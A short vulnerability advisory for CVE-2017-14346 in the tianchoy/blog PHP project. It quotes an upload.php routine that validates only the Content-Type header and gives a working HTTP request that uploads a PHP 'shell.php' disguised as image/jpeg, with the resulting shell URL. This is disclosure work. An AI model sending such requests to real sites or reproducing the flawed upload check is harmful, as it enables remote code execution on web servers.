## powered by sebao from 404team ##

**CVE-2017-14346**

tianchoy/blog allows remote attackers to unauthentication of administrators for requests that upload PHP files. 


## Vulnerability link ##

https://github.com/tianchoy/blog

## Vulnerability details ##

in upload.php Line 11

	  switch($type){
	  case 'image/pjpeg': $ok=1;
	       break;
	case'image/png' : $ok=1;
	   break;
	case 'image/gif' :$ok=1;
	   break;
	case 'image/jpeg' :$ok=1;
	   break; 
	 } 
	 if($ok && $error=='0'){
	  move_uploaded_file($tmp_name,'images/'.$name);  
	   echo "ok";
	} else{
	 echo "fail!";      //非图片格式，给出提示
	      }
	 }
	}

this code only check the file content-type. if attackers set content-type to image/jpeg can upload any file.for example php file

exploit:



	POST /upload.php HTTP/1.1
	Host: loclahost
	User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
	Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
	Accept-Encoding: gzip, deflate
	Content-Type: multipart/form-data; boundary=---------------------------140872878228742
	Content-Length: 208
	Connection: close
	Upgrade-Insecure-Requests: 1
	
	-----------------------------140872878228742
	Content-Disposition: form-data; name="upfile"; filename="shell.php"
	Content-Type: image/jpeg
	
	<?php phpinfo();?>
	-----------------------------140872878228742--

then the shell url is `http://localhost/images/shell.php`
